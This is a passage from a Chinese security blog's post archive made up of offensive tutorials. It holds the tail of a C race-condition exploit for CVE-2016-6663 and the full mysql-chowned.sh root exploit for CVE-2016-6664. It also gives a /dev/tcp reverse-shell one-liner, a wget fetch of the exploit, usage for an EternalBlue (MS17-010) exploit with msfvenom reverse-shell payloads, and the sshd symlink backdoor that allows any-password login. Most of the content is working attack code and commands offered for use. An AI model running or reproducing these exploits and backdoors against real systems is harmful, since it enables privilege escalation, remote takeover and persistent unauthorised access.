Set the .MYD permissions to suid+exec before they get copied to the .TMD file </span></span><br><span class="line">    unlink(MYSQL_TAB_FILE);</span><br><span class="line">    myd_handle = open(MYSQL_TAB_FILE, O_CREAT, <span class="number">0777</span>);</span><br><span class="line">    close(myd_handle);</span><br><span class="line">    chmod(MYSQL_TAB_FILE, <span class="number">04777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Replace the temp .TMD file with a symlink to the target sh binary to get suid+exec</span></span><br><span class="line">                            unlink(MYSQL_TEMP_FILE);</span><br><span class="line">                            symlink(SUID_SHELL, MYSQL_TEMP_FILE);</span><br><span class="line">                            io_notified=<span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    processed += <span class="keyword">sizeof</span>(struct inotify_event);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (io_notified) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if SUID bit was set at the end of this attempt</span></span><br><span class="line">        <span class="keyword">if</span> ( lstat(SUID_SHELL, &amp;st) == <span class="number">0</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (st.st_mode &amp; S_ISUID) &#123;</span><br><span class="line">is_shell_suid = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n[+] \033[94mBingo! Race won (took %lu tries) !\033[0m Check out the \033[94mmysql SUID shell\033[0m: \n\n"</span>, cnt);</span><br><span class="line">    system(<span class="string">"ls -l "</span> SUID_SHELL);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Spawning the \033[94mmysql SUID shell\033[0m now... \n    Remember that from there you can gain \033[1;31mroot\033[0m with vuln \033[1;31mCVE-2016-6662\033[0m or \033[1;31mCVE-2016-6664\033[0m :)\n\n"</span>);</span><br><span class="line">    system(SUID_SHELL <span class="string">" -p -i "</span>);</span><br><span class="line">    <span class="comment">//system(SUID_SHELL " -p -c '/bin/bash -i -p'");</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* close MySQL connection and exit */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[+] Job done. Exiting\n\n"</span>);</span><br><span class="line">    mysql_close(conn);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>2.反弹shell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p>3.反弹shell的监听端，执行如下指令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">gcc mysql-privesc-race.c -o mysql-privesc-race -I/usr/include/mysql -lmysqlclient</span><br><span class="line">./mysql-privesc-race <span class="built_in">test</span> 123456 localhost testdb</span><br></pre></td></tr></table></figure></p><p>如图可以看到已提升为mysql权限</p><p><img src="http://blackwolfsec.cc/static/picture/mysql_www-data2mysql.png" alt="提升为mysql权限"></p><h2 id="0x03Mysql权限提升为root权限"><a href="#0x03Mysql权限提升为root权限" class="headerlink" title="0x03Mysql权限提升为root权限"></a>0x03Mysql权限提升为root权限</h2><p>利用CVE-2016-6664<br>ps:<strong>目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式</strong><br>不过tutum/lamp日志方式为syslog，需要如下修改<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> /etc/mysql/<span class="keyword">conf</span>.d/mysqld_safe_syslog.<span class="keyword">cnf</span></span><br><span class="line">删除syslog</span><br><span class="line">重启mysql：mysqld_safe --user=mysql</span><br></pre></td></tr></table></figure></p><p>测试办法<code>grep -r syslog /etc/mysql</code>返回没有任何结果既满足“基于文件的日志”要求<br>上传mysql-chowned.sh，内容如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash -p</span></span><br><span class="line"><span class="comment"># Usage:</span></span><br><span class="line"><span class="comment"># ./mysql-chowned.sh path_to_error.log </span></span><br><span class="line">BACKDOORSH=<span class="string">"/bin/bash"</span></span><br><span class="line">BACKDOORPATH=<span class="string">"/tmp/mysqlrootsh"</span></span><br><span class="line">PRIVESCLIB=<span class="string">"/tmp/privesclib.so"</span></span><br><span class="line">PRIVESCSRC=<span class="string">"/tmp/privesclib.c"</span></span><br><span class="line">SUIDBIN=<span class="string">"/usr/bin/sudo"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> cleanexit &#123;</span><br><span class="line"><span class="comment"># Cleanup </span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Cleaning up..."</span></span><br><span class="line">rm -f <span class="variable">$PRIVESCSRC</span></span><br><span class="line">rm -f <span class="variable">$PRIVESCLIB</span></span><br><span class="line">rm -f <span class="variable">$ERRORLOG</span></span><br><span class="line">touch <span class="variable">$ERRORLOG</span></span><br><span class="line"><span class="keyword">if</span> [ -f /etc/ld.so.preload ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -n &gt; /etc/ld.so.preload</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Job done. Exiting with code <span class="variable">$1</span> \n"</span></span><br><span class="line"><span class="built_in">exit</span> <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">ctrl_c</span></span>() &#123;</span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">"\n[+] Ctrl+C pressed"</span></span><br><span class="line">cleanexit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#intro </span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\033[94m \nMySQL / MariaDB / Percona - Root Privilege Escalation PoC Exploit \nmysql-chowned.sh (ver. 1.0)\n\nCVE-2016-6664 / CVE-2016-5617\n"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Args</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -lt 1 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] Exploit usage: \n\n<span class="variable">$0</span> path_to_error.log \n"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"It seems that this server uses: `ps aux | grep mysql | awk -F'log-error=' '&#123; print <span class="variable">$2</span> &#125;' | cut -d' ' -f1 | grep '/'`\n"</span></span><br><span class="line"><span class="built_in">exit</span> 3</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Priv check</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Starting the exploit as \n\033[94m`id`\033[0m"</span></span><br><span class="line">id | grep -q mysql </span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] You need to execute the exploit as mysql user! Exiting.\n"</span></span><br><span class="line"><span class="built_in">exit</span> 3</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set target paths</span></span><br><span class="line">ERRORLOG=<span class="string">"<span class="variable">$1</span>"</span></span><br><span class="line"><span class="keyword">if</span> [ ! -f <span class="variable">$ERRORLOG</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] The specified MySQL error log (<span class="variable">$ERRORLOG</span>) doesn't exist. Try again.\n"</span></span><br><span class="line"><span class="built_in">exit</span> 3</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Target MySQL log file set to <span class="variable">$ERRORLOG</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [ Active exploitation ]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">trap</span> ctrl_c INT</span><br><span class="line"><span class="comment"># Compile privesc preload library</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Compiling the privesc shared library (<span class="variable">$PRIVESCSRC</span>)"</span></span><br><span class="line">cat &lt;&lt;_solibeof_&gt;<span class="variable">$PRIVESCSRC</span></span><br><span class="line"><span class="comment">#define _GNU_SOURCE</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;dlfcn.h&gt;</span></span><br><span class="line">       <span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line">       <span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line">       <span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"></span><br><span class="line">uid_t geteuid(void) &#123;</span><br><span class="line">static uid_t  (*old_geteuid)();</span><br><span class="line">old_geteuid = dlsym(RTLD_NEXT, <span class="string">"geteuid"</span>);</span><br><span class="line"><span class="keyword">if</span> ( old_geteuid() == 0 ) &#123;</span><br><span class="line">chown(<span class="string">"<span class="variable">$BACKDOORPATH</span>"</span>, 0, 0);</span><br><span class="line">chmod(<span class="string">"<span class="variable">$BACKDOORPATH</span>"</span>, 04777);</span><br><span class="line">//unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">return</span> old_geteuid();</span><br><span class="line">&#125;</span><br><span class="line">_solibeof_</span><br><span class="line">/bin/bash -c <span class="string">"gcc -Wall -fPIC -shared -o <span class="variable">$PRIVESCLIB</span> <span class="variable">$PRIVESCSRC</span> -ldl"</span></span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] Failed to compile the privesc lib <span class="variable">$PRIVESCSRC</span>."</span></span><br><span class="line">cleanexit 2;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare backdoor shell</span></span><br><span class="line">cp <span class="variable">$BACKDOORSH</span> <span class="variable">$BACKDOORPATH</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Backdoor/low-priv shell installed at: \n`ls -l <span class="variable">$BACKDOORPATH</span>`"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Safety check</span></span><br><span class="line"><span class="keyword">if</span> [ -f /etc/ld.so.preload ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] /etc/ld.so.preload already exists. Exiting for safety."</span></span><br><span class="line"><span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Symlink the log file to /etc</span></span><br><span class="line">rm -f <span class="variable">$ERRORLOG</span> &amp;&amp; ln -s /etc/ld.so.preload <span class="variable">$ERRORLOG</span></span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] Couldn't remove the <span class="variable">$ERRORLOG</span> file or create a symlink."</span></span><br><span class="line">cleanexit 3</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Symlink created at: \n`ls -l <span class="variable">$ERRORLOG</span>`"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Wait for MySQL to re-open the logs</span></span><br><span class="line"><span class="built_in">echo</span> -ne <span class="string">"\n[+] Waiting for MySQL to re-open the logs/MySQL service restart...\n"</span></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">"Do you want to kill mysqld process `pidof mysqld` to instantly get root? :) ? [y/n] "</span></span><br><span class="line"><span class="built_in">read</span> THE_ANSWER</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$THE_ANSWER</span>"</span> = <span class="string">"y"</span> ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"Got it. Executing 'killall mysqld' now..."</span></span><br><span class="line">killall mysqld</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">while</span> :; <span class="keyword">do</span> </span><br><span class="line">sleep 0.1</span><br><span class="line"><span class="keyword">if</span> [ -f /etc/ld.so.preload ]; <span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PRIVESCLIB</span> &gt; /etc/ld.so.preload</span><br><span class="line">rm -f <span class="variable">$ERRORLOG</span></span><br><span class="line"><span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inject the privesc.so shared library to escalate privileges</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PRIVESCLIB</span> &gt; /etc/ld.so.preload</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] MySQL restarted. The /etc/ld.so.preload file got created with mysql privileges: \n`ls -l /etc/ld.so.preload`"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Adding <span class="variable">$PRIVESCLIB</span> shared lib to /etc/ld.so.preload"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"</span></span><br><span class="line">chmod 755 /etc/ld.so.preload</span><br><span class="line"></span><br><span class="line"><span class="comment"># Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Escalating privileges via the <span class="variable">$SUIDBIN</span> SUID binary to get root!"</span></span><br><span class="line">sudo 2&gt;/dev/null &gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment">#while :; do </span></span><br><span class="line"><span class="comment">#sleep 0.1</span></span><br><span class="line"><span class="comment">#ps aux | grep mysqld | grep -q 'log-error'</span></span><br><span class="line"><span class="comment">#if [ $? -eq 0 ]; then</span></span><br><span class="line"><span class="comment">#break;</span></span><br><span class="line"><span class="comment">#fi</span></span><br><span class="line"><span class="comment">#done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for the rootshell</span></span><br><span class="line">ls -l <span class="variable">$BACKDOORPATH</span></span><br><span class="line">ls -l <span class="variable">$BACKDOORPATH</span> | grep rws | grep -q root</span><br><span class="line"><span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span> </span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Rootshell got assigned root SUID perms at: \n`ls -l <span class="variable">$BACKDOORPATH</span>`"</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n\033[94mGot root! The database server has been ch-OWNED !\033[0m"</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[!] Failed to get root"</span></span><br><span class="line">cleanexit 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Execute the rootshell</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n[+] Spawning the rootshell <span class="variable">$BACKDOORPATH</span> now! \n"</span></span><br><span class="line"><span class="variable">$BACKDOORPATH</span> -p -c <span class="string">"rm -f /etc/ld.so.preload; rm -f <span class="variable">$PRIVESCLIB</span>"</span></span><br><span class="line"><span class="variable">$BACKDOORPATH</span> -p -i</span><br><span class="line"></span><br><span class="line"><span class="comment"># Job done.</span></span><br><span class="line">cleanexit 0</span><br></pre></td></tr></table></figure></p><p><strong>必须以mysql权限执行才能成功提为root</strong>，可以利用CVE-2016-6663提升为mysql权限的shell执行如下指令<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//legalhackers.com/exploits/CVE-2016-6664/mysql-chowned.sh</span></span><br><span class="line">chmod 777 mysql-chowned.<span class="keyword">sh</span></span><br><span class="line">./mysql-chowned.<span class="keyword">sh</span> /<span class="keyword">var</span>/<span class="keyword">log</span>/mysql/<span class="keyword">error</span>.<span class="built_in">log</span></span><br></pre></td></tr></table></figure></p><p>如图可以看到已获得root权限</p><p><img src="http://blackwolfsec.cc/static/picture/mysql_mysql2root.png" alt="提升为root权限"></p><h2 id="0x04回顾"><a href="#0x04回顾" class="headerlink" title="0x04回顾"></a>0x04回顾</h2><h3 id="www-data权限提升为mysql的条件"><a href="#www-data权限提升为mysql的条件" class="headerlink" title="www-data权限提升为mysql的条件"></a>www-data权限提升为mysql的条件</h3><p>1.已经getshell，获得www-data权限<br>2.获取到一个拥有create,drop,insert,select权限的数据库账号，密码<br>3.提权过程需要在交互式的shell环境中运行，所以需要反弹shell再提权</p><h3 id="mysql提升为root权限的条件"><a href="#mysql提升为root权限的条件" class="headerlink" title="mysql提升为root权限的条件"></a>mysql提升为root权限的条件</h3><p>1.目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式（通过cat /etc/mysql/conf.d/mysqld_safe_syslog.cnf查看没有包含“syslog”字样即可）<br>2.需要在mysql权限下运行才能利用（可通过上面的方式先获取mysql权限）</p><p>参考链接：<br>1.<a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html</a><br>2.<a href="http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Maria-Percona-RootPrivEsc-CVE-2016-6664-5617-Exploit.html</a><br>3.<a href="http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html" target="_blank" rel="noopener">http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html</a><br>4.<a href="http://bobao.360.cn/learning/detail/3027.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/3027.html</a></p>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Mysql </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Eternalblue（MS17-010）纯Python3利用脚本</title>
      <link href="/2017/05/12/Eternalblue_ms17-010/"/>
      <url>/2017/05/12/Eternalblue_ms17-010/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间Equation Group泄露Eternalblue(MS17-010)的利用工具，搭建环境比较麻烦，借助exploit-db上的exp优化修改了一个纯python3的利用脚本。<br> <a id="more"></a></p><h2 id="0x01-使用简介"><a href="#0x01-使用简介" class="headerlink" title="0x01 使用简介"></a>0x01 使用简介</h2><p>1.直接运行python3 ./ms17-010.py，提示使用方法及以x64为例的shellcode生成命令（亲测直接用Dll文件会蓝屏）<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Usage</span>: python3 ./ms17-010.py --host xxx --file xxx --port xxx</span><br><span class="line"></span><br><span class="line">[!] You can make a nc reverse shell USER_SHELLCODE_FILE in kali2.0 by use :</span><br><span class="line">    "msfvenom -p windows/x64/shell_reverse_tcp   LHOST=x.x.x.x LPORT=xxx -f raw &gt; shellcode"</span><br><span class="line"></span><br><span class="line">[!] You can make a meterpreter reverse shell USER_SHELLCODE_FILE in kali2.0 by use :</span><br><span class="line">    "msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=x.x.x.x LPORT=xxx -f raw &gt; shellcode"</span><br></pre></td></tr></table></figure></p><p>2.直接运行python3 ./ms17-010.py -h提示参数的含义（除非getshell以后的特殊提权利用以外，通常不需要修改端口号）<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">usage</span>: ms17-010.py [-h] [--host HOST] [--port PORT] [--file FILE]</span><br><span class="line"></span><br><span class="line">Process some integers.</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  --host HOST, -H HOST  Host ip</span><br><span class="line">  --port PORT, -p PORT  Target port,defalut:445</span><br><span class="line">  --file FILE, -f FILE  User shellcode file</span><br></pre></td></tr></table></figure></p><p>3.利用反弹shellcode需要在反弹主机上监听对应端口<br>3.1 nc:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span></span><br></pre></td></tr></table></figure></p><p>3.2 meterpreter:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler </span><br><span class="line"><span class="builtin-name">set</span> windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="builtin-name">set</span> lhost x.x.x.x</span><br><span class="line"><span class="builtin-name">set</span> lport xxx</span><br></pre></td></tr></table></figure></p><h2 id="0x02-源码"><a href="#0x02-源码" class="headerlink" title="0x02 源码"></a>0x02 源码</h2><p><a href="http://blackwolfsec.cc/static/code/ms17-010.py">http://blackwolfsec.cc/static/code/ms17-010.py</a></p><p>提示:<br>本博客里任何文章/动画/教程以及各类软件/工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负。</p>]]></content>
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
            <tag> Python </tag>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux软连接ssh后门之我见</title>
      <link href="/2017/03/24/Linux_ssh_backdoor/"/>
      <url>/2017/03/24/Linux_ssh_backdoor/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>学习了Sevck发表Linux软连接后门的<a href="https://xianzhi.aliyun.com/forum/mobile/read/790.html" target="_blank" rel="noopener">《一条命令引发的思考》</a>，还是存在几个疑惑点，仔细探究之后就有了这篇文章<br><a id="more"></a></p><h2 id="0x01简单回顾"><a href="#0x01简单回顾" class="headerlink" title="0x01简单回顾"></a>0x01简单回顾</h2><p><strong>一、Linux经典软连接后门命令</strong><br>1.在被控制端执行：<br>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345建立sshd的软连接<br>2.本地客户端执行：<br>ssh <a href="mailto:root@x.x.x.x" target="_blank" rel="noopener">root@x.x.x.x</a> -p 12345接着输入任意密码就可以root用户权限登陆了<br>实际测试中发现，如果root用户被禁止登陆时此方式不能直接登陆，但是可以利用其他存在的用户身份登陆，如：<br>ssh <a href="mailto:ubuntu@x.x.x.x" target="_blank" rel="noopener">ubuntu@x.x.x.x</a> -p 12345接着输入任意密码就可以ubuntu用户权限登陆了<br><strong>二、后门原理</strong><br> 在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0（root）即可成功认证登陆</p><h2 id="0x02疑惑与探究"><a href="#0x02疑惑与探究" class="headerlink" title="0x02疑惑与探究"></a>0x02疑惑与探究</h2><p>1.不建立链接直接启动/usr/sbin/sshd是否也能任意密码登陆<br>针对这个疑惑很容易验证，被控端执行命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/sshd -oport=12345</span><br></pre></td></tr></table></figure></p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_00.png" alt="直接启动sshd" title="ssh_backdoor_00.png"><br>客户端<code>ssh root:任意密码@x.x.x.x 12345</code>登录失败<br>实践结果表明不能通过直接启动/usr/sbin/sshd,默认使用/etc/pam.d/sshd的pam配置文件，因而不能建立任意密码登录的后门<br>2.sshd是否允许PAM认证对后门是否有影响<br>修改<code>/etc/ssh/sshd_config</code>修改设置<code>UsePAM no</code></p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_0.png" alt="设置UsePAM=no" title="ssh_backdoor_0.png"><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345</span><br></pre></td></tr></table></figure></p><p>客户端<code>ssh root:任意密码@x.x.x.x 12345</code>登录失败</p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_1.png" alt="sshd禁止pam登陆" 